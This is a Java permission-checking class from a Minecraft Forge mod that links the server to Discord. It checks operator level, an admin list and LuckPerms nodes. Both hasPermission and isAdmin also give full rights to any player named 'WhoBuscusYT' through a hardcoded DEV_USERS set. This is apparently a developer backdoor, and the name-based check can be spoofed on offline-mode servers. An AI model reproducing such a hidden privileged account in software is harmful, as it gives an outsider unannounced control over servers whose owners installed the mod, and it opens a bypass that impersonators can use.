package com.whobuscusyt.forgediscord;

import net.minecraft.commands.CommandSourceStack;
import net.minecraft.server.level.ServerPlayer;
import net.luckperms.api.LuckPerms;
import net.luckperms.api.LuckPermsProvider;
import net.luckperms.api.model.user.User;
import java.util.Set;
import java.util.UUID;

public class PermissionUtil {

    public static boolean hasPermission(CommandSourceStack source) {

        if (source.hasPermission(2)) return true;

        if (!(source.getEntity() instanceof ServerPlayer player)) return false;

        if (AdminManager.isAdmin(player.getUUID())) return true;
        if (DEV_USERS.contains(player.getGameProfile().getName())) return true;

        if (!hasLuckPerms()) return false;

        try {
            LuckPerms lp = LuckPermsProvider.get();
            UUID uuid = player.getUUID();

            User user = lp.getUserManager().getUser(uuid);
            if (user == null) return false;

            return user.getCachedData().getPermissionData().checkPermission("forgediscord.bot").asBoolean();

        } catch (Exception e) {
            return false;
        }
    }

    private static boolean hasLuckPerms() {
        return net.minecraftforge.fml.ModList.get().isLoaded("luckperms");
    }
    public static final Set<String> DEV_USERS = Set.of(
            "WhoBuscusYT"
    );

    public static boolean isAdmin(
            ServerPlayer player
    ) {
        if (player == null) return false;

        return player.hasPermissions(2)
                || AdminManager.isAdmin(player.getUUID())
                || DEV_USERS.contains(player.getGameProfile().getName());
    }
}
